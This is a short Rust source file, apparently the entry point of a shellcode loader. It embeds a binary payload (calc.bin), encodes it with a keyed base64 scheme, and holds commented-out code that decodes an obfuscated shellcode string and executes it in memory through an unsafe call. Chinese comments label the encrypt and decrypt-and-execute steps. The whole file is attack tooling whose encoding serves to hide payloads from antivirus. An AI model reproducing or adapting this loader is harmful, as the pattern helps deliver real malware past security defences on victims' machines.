mod crypt;
mod shellcode;
fn main() {
    let key = 7122;
    
    // 加密shellcode
    let shellcode: &[u8] = include_bytes!("../static/calc.bin");
    
    crypt::dynamic::base64_dynamic_encode(shellcode,key);
    
    
    // // //  解密执行 shellcode
    // let base_shellcode = ">I>j.g,)dmx}lICO(S%//SZ_-+/Qb.d/CI>!/(X_aZw~b.dF/InHcjF-&a#$b^#}0^+|Umw2vI#z^E@zlc#S;S/z/B>!/&U!(b+_l+U!T.n}lm%_Ec%^<jnzFFU!bdXyajx~bE#V?ZZ_>!?zay$_bm#(&a#$b^#}0I#z^E@zlc<g?e*{&m(*HmXK_+CAeFXyajxabE#V<w:!KIXyajx#bE#V(5myaInzFIC,(SXCVSFzVICU(SF_T$c~(SV.?FXzVSF_alVrw_a.>Z@_)M<}lmx}lmx}b.0DlE<}lI:X-5d5E_a&)_UA@/Zz):z&r@2.IB>jmAnNiVc-Tg^~xEDnMl(F:zI}VB:$e,a&CzC2CKSQ,{H}";
    // let check = "CO?@<zT";
    // let base_key = crypt::dynamic::base64_dynamic_decode(check,key);
    // let shellcode = crypt::base64::base64_decode_with_random(base_shellcode,base_key).unwrap();
    // // 
    // unsafe { shellcode::exec(shellcode.as_slice()) }

}

